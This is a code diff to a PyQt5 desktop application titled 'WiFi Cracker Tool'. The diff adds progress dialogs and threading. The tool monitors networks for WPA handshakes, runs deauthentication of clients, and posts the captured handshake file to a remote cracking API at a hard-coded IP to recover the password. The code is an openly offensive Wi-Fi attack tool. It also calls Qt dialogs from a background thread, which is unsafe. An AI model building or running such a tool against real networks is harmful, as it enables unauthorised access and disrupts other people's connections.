@@ -2,10 +2,11 @@ import sys
 import subprocess
 import requests
 import csv
-from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTableWidget, QTableWidgetItem, QLabel, QInputDialog, QMessageBox, QHeaderView)
+from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTableWidget, QTableWidgetItem, QLabel, QInputDialog, QMessageBox, QHeaderView, QProgressDialog)
 import re
 import os
 import time
+import threading
 
 class WiFiCrackerApp(QWidget):
     def __init__(self):
@@ -13,9 +14,18 @@ class WiFiCrackerApp(QWidget):
         self.initUI()
 
     def initUI(self):
+        # Ensure output_files directory is cleared
+        output_dir = 'output_files'
+        if not os.path.exists(output_dir):
+            os.makedirs(output_dir)
+        for file in os.listdir(output_dir):
+            file_path = os.path.join(output_dir, file)
+            if os.path.isfile(file_path):
+                os.remove(file_path)
         # Set up the window
         self.setWindowTitle('WiFi Cracker Tool')
-        self.setGeometry(100, 100, 1200, 600)
+        self.setGeometry(0, 0, 1200, 600)
+        self.move(QApplication.desktop().screen().rect().center() - self.rect().center())
 
         # Create layout
         main_layout = QVBoxLayout()
@@ -94,6 +104,12 @@ class WiFiCrackerApp(QWidget):
             QMessageBox.critical(self, 'Error', f'Failed to refresh networks: {e}')
 
     def monitor_handshake(self):
+        # Create a loading bar for handshake monitoring
+        progress = QProgressDialog('Monitoring for WPA handshake...', None, 0, 0, self)
+        progress.setWindowTitle('Waiting for Handshake')
+        progress.setCancelButton(None)
+        progress.setMinimumDuration(0)
+        progress.setValue(0)
         # Monitor the selected network for handshake
         selected_row = self.networks_table.currentRow()
         if selected_row == -1:
@@ -111,9 +127,13 @@ class WiFiCrackerApp(QWidget):
             while True:
                 output = process.stdout.readline()
                 print(output, end='')
+                progress.setValue(progress.value() + 1)
+                QApplication.processEvents()
                 if 'WPA handshake' in output:
+                    progress.close()
                     print('Handshake captured!')
                     time.sleep(2)
+                    progress.close()
                     process.terminate()
                     break
             # Run monitoring tool (e.g., airodump-ng) to capture handshake
@@ -130,15 +150,37 @@ class WiFiCrackerApp(QWidget):
             with open('output_files/handshake.hccapx', 'rb') as f:
                 handshake_data = f.read()
 
-            response = requests.post('http://172.31.124.39:5000/crack_wifi', data={'handshake': handshake_data, 'mask': mask})
-            cracked_password = response.json().get('cracked_password')
+            progress = QProgressDialog('Sending handshake to API...', None, 0, 0, self)
+            progress.setWindowTitle('Waiting for API Response')
+            progress.setCancelButton(None)
+            progress.setMinimumDuration(0)
+            progress.setValue(0)
+            progress.setMaximum(0)
+            QApplication.processEvents()
 
-            # Show the cracked password
-            QMessageBox.information(self, 'Cracked Password', f'Cracked Password: {cracked_password}')
+            # Run API request in a separate thread
+            def send_handshake():
+                try:
+                    response = requests.post('http://172.31.124.39:5000/crack_wifi', data={'handshake': handshake_data, 'mask': mask})
+                    cracked_password = response.json().get('cracked_password')
+                    progress.close()
+                    QMessageBox.information(self, 'Cracked Password', f'Cracked Password: {cracked_password}')
+                except Exception as e:
+                    progress.close()
+                    QMessageBox.critical(self, 'Error', f'Failed to send handshake to API: {e}')
+
+            thread = threading.Thread(target=send_handshake)
+            thread.start()
         except Exception as e:
             QMessageBox.critical(self, 'Error', f'Failed to capture handshake: {e}')
 
     def run_deauth(self):
+        # Create a loading bar for handshake monitoring
+        progress = QProgressDialog('Monitoring for WPA handshake...', None, 0, 0, self)
+        progress.setWindowTitle('Waiting for Handshake')
+        progress.setCancelButton(None)
+        progress.setMinimumDuration(0)
+        progress.setValue(0)
         selected_row = self.networks_table.currentRow()
         if selected_row == -1:
             QMessageBox.warning(self, 'Warning', 'Please select a WiFi network to deauthenticate.')
@@ -156,7 +198,10 @@ class WiFiCrackerApp(QWidget):
             while True:
                 output = monitor_process.stdout.readline()
                 print(output, end='')
+                progress.setValue(progress.value() + 1)
+                QApplication.processEvents()
                 if 'WPA handshake' in output:
+                    progress.close()
                     print('Handshake captured!')
                     time.sleep(2)
                     break
